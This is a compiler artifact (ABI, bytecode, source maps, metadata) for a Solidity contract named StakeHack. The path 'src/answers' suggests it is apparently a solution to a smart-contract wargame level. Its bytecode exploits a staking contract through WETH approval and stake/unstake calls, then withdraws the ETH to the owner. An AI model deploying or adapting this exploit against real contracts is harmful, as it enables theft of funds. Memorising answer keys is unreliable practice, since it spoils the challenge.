{"abi":[{"type":"constructor","inputs":[{"name":"_stake","type":"address","internalType":"address"},{"name":"_weth","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"stake","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IStake"}],"stateMutability":"view"},{"type":"function","name":"weth","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IWETH"}],"stateMutability":"view"},{"type":"function","name":"withdrawETH","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610587380380610587833981016040819052602b916084565b5f80546001600160a01b039384166001600160a01b031991821617909155600180549290931691811691909117909155600280549091163317905560b0565b80516001600160a01b0381168114607f575f5ffd5b919050565b5f5f604083850312156094575f5ffd5b609b83606a565b915060a760208401606a565b90509250929050565b6104ca806100bd5f395ff3fe60806040526004361061005b575f3560e01c806363d9b7701161004157806363d9b770146100bf5780638da5cb5b146100d5578063e086e5ec146100f4575f5ffd5b80633a4b66f1146100665780633fc8cef3146100a0575f5ffd5b3661006257005b5f5ffd5b348015610071575f5ffd5b505f54610084906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100ab575f5ffd5b50600154610084906001600160a01b031681565b3480156100ca575f5ffd5b506100d3610108565b005b3480156100e0575f5ffd5b50600254610084906001600160a01b031681565b3480156100ff575f5ffd5b506100d36103d7565b6002546001600160a01b031633146101545760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b6001545f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b039182166004820152670de0b6b3a76400006024820181905292919091169063095ea7b3906044016020604051808303815f875af11580156101ca573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee9190610457565b505f80546040517f6e35c740000000000000000000000000000000000000000000000000000000008152600481018490526001600160a01b0390911690636e35c740906024016020604051808303815f875af1158015610250573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102749190610457565b5f80546040517f7b23331900000000000000000000000000000000000000000000000000000000815230600482015292935090916001600160a01b0390911690637b23331990602401602060405180830381865afa1580156102d8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102fc919061047d565b905082811461034d5760405162461bcd60e51b815260206004820152600e60248201527f4578706c6f6974206661696c6564000000000000000000000000000000000000604482015260640161014b565b5f546040517ff1f1db1e000000000000000000000000000000000000000000000000000000008152600481018590526001600160a01b039091169063f1f1db1e906024016020604051808303815f875af11580156103ad573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d19190610457565b50505050565b6002546001600160a01b0316331461041e5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161014b565b6002546040516001600160a01b03909116904780156108fc02915f818181858888f19350505050158015610454573d5f5f3e3d5ffd5b50565b5f60208284031215610467575f5ffd5b81518015158114610476575f5ffd5b9392505050565b5f6020828403121561048d575f5ffd5b505191905056fea264697066735822122054cc6cf1c861e656b426399633f678519a9a33828c0e5cc8f8e6a18aa01e9a2e64736f6c634300081c0033","sourceMap":"370:1200:0:-:0;;;474:139;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;527:5;:22;;-1:-1:-1;;;;;527:22:0;;;-1:-1:-1;;;;;;527:22:0;;;;;;;;559:19;;;;;;;;;;;;;;;;588:5;:18;;;;;596:10;588:18;;;370:1200;;14:177:1;93:13;;-1:-1:-1;;;;;135:31:1;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:293::-;275:6;283;336:2;324:9;315:7;311:23;307:32;304:52;;;352:1;349;342:12;304:52;375:40;405:9;375:40;:::i;:::-;365:50;;434:49;479:2;468:9;464:18;434:49;:::i;:::-;424:59;;196:293;;;;;:::o;:::-;370:1200:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x60806040526004361061005b575f3560e01c806363d9b7701161004157806363d9b770146100bf5780638da5cb5b146100d5578063e086e5ec146100f4575f5ffd5b80633a4b66f1146100665780633fc8cef3146100a0575f5ffd5b3661006257005b5f5ffd5b348015610071575f5ffd5b505f54610084906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100ab575f5ffd5b50600154610084906001600160a01b031681565b3480156100ca575f5ffd5b506100d3610108565b005b3480156100e0575f5ffd5b50600254610084906001600160a01b031681565b3480156100ff575f5ffd5b506100d36103d7565b6002546001600160a01b031633146101545760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b6001545f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b039182166004820152670de0b6b3a76400006024820181905292919091169063095ea7b3906044016020604051808303815f875af11580156101ca573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee9190610457565b505f80546040517f6e35c740000000000000000000000000000000000000000000000000000000008152600481018490526001600160a01b0390911690636e35c740906024016020604051808303815f875af1158015610250573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102749190610457565b5f80546040517f7b23331900000000000000000000000000000000000000000000000000000000815230600482015292935090916001600160a01b0390911690637b23331990602401602060405180830381865afa1580156102d8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102fc919061047d565b905082811461034d5760405162461bcd60e51b815260206004820152600e60248201527f4578706c6f6974206661696c6564000000000000000000000000000000000000604482015260640161014b565b5f546040517ff1f1db1e000000000000000000000000000000000000000000000000000000008152600481018590526001600160a01b039091169063f1f1db1e906024016020604051808303815f875af11580156103ad573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d19190610457565b50505050565b6002546001600160a01b0316331461041e5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161014b565b6002546040516001600160a01b03909116904780156108fc02915f818181858888f19350505050158015610454573d5f5f3e3d5ffd5b50565b5f60208284031215610467575f5ffd5b81518015158114610476575f5ffd5b9392505050565b5f6020828403121561048d575f5ffd5b505191905056fea264697066735822122054cc6cf1c861e656b426399633f678519a9a33828c0e5cc8f8e6a18aa01e9a2e64736f6c634300081c0033","sourceMap":"370:1200:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;395:19;;;;;;;;;;-1:-1:-1;395:19:0;;;;-1:-1:-1;;;;;395:19:0;;;;;;-1:-1:-1;;;;;191:55:1;;;173:74;;161:2;146:18;395:19:0;;;;;;;420:17;;;;;;;;;;-1:-1:-1;420:17:0;;;;-1:-1:-1;;;;;420:17:0;;;623:707;;;;;;;;;;;;;:::i;:::-;;443:20;;;;;;;;;;-1:-1:-1;443:20:0;;;;-1:-1:-1;;;;;443:20:0;;;1340:147;;;;;;;;;;;;;:::i;623:707::-;683:5;;-1:-1:-1;;;;;683:5:0;669:10;:19;661:42;;;;-1:-1:-1;;;661:42:0;;934:2:1;661:42:0;;;916:21:1;973:2;953:18;;;946:30;-1:-1:-1;;;992:18:1;;;985:40;1042:18;;661:42:0;;;;;;;;;846:4;;812:14;867:5;846:36;;;;;-1:-1:-1;;;;;867:5:0;;;846:36;;;1245:74:1;829:7:0;1335:18:1;;;1328:34;;;829:7:0;846:4;;;;;:12;;1218:18:1;;846:36:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1002:11:0;1016:5;;:23;;;;;;;;1801:25:1;;;-1:-1:-1;;;;;1016:5:0;;;;:15;;1774:18:1;;1016:23:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1149:16;1168:5;;:30;;;;;1192:4;1168:30;;;173:74:1;1002:37:0;;-1:-1:-1;1149:16:0;;-1:-1:-1;;;;;1168:5:0;;;;:15;;146:18:1;;1168:30:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1149:49;;1228:6;1216:8;:18;1208:45;;;;-1:-1:-1;;;1208:45:0;;2228:2:1;1208:45:0;;;2210:21:1;2267:2;2247:18;;;2240:30;2306:16;2286:18;;;2279:44;2340:18;;1208:45:0;2026:338:1;1208:45:0;1302:5;;:21;;;;;;;;1801:25:1;;;-1:-1:-1;;;;;1302:5:0;;;;:13;;1774:18:1;;1302:21:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;651:679;;;623:707::o;1340:147::-;1404:5;;-1:-1:-1;;;;;1404:5:0;1390:10;:19;1382:42;;;;-1:-1:-1;;;1382:42:0;;934:2:1;1382:42:0;;;916:21:1;973:2;953:18;;;946:30;-1:-1:-1;;;992:18:1;;;985:40;1042:18;;1382:42:0;732:334:1;1382:42:0;1442:5;;1434:46;;-1:-1:-1;;;;;1442:5:0;;;;1458:21;1434:46;;;;;1442:5;1434:46;1442:5;1434:46;1458:21;1442:5;1434:46;;;;;;;;;;;;;;;;;;;;;1340:147::o;1373:277:1:-;1440:6;1493:2;1481:9;1472:7;1468:23;1464:32;1461:52;;;1509:1;1506;1499:12;1461:52;1541:9;1535:16;1594:5;1587:13;1580:21;1573:5;1570:32;1560:60;;1616:1;1613;1606:12;1560:60;1639:5;1373:277;-1:-1:-1;;;1373:277:1:o;1837:184::-;1907:6;1960:2;1948:9;1939:7;1935:23;1931:32;1928:52;;;1976:1;1973;1966:12;1928:52;-1:-1:-1;1999:16:1;;1837:184;-1:-1:-1;1837:184:1:o","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","owner()":"8da5cb5b","stake()":"3a4b66f1","weth()":"3fc8cef3","withdrawETH()":"e086e5ec"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_stake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_weth\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stake\",\"outputs\":[{\"internalType\":\"contract IStake\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"weth\",\"outputs\":[{\"internalType\":\"contract IWETH\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/StakeHack.sol\":\"StakeHack\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/StakeHack.sol\":{\"keccak256\":\"0x22d2be89a9d2d84c04e7a68eb98fc34c2509568b4c1f4ef2812609f4e018f553\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b3fb468005725fede9b979d633e3bb220b31f415b0fb3774220c9b31a48521a7\",\"dweb:/ipfs/QmdtnLVuyEQ53uM7tRgrtzBVA9NMLeaGwk3k77DaHLrJRX\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_stake","type":"address"},{"internalType":"address","name":"_weth","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"exploit"},{"inputs":[],"stateMutability":"view","type":"function","name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"stake","outputs":[{"internalType":"contract IStake","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"weth","outputs":[{"internalType":"contract IWETH","name":"","type":"address"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"withdrawETH"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/StakeHack.sol":"StakeHack"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/StakeHack.sol":{"keccak256":"0x22d2be89a9d2d84c04e7a68eb98fc34c2509568b4c1f4ef2812609f4e018f553","urls":["bzz-raw://b3fb468005725fede9b979d633e3bb220b31f415b0fb3774220c9b31a48521a7","dweb:/ipfs/QmdtnLVuyEQ53uM7tRgrtzBVA9NMLeaGwk3k77DaHLrJRX"],"license":"MIT"}},"version":1},"id":0}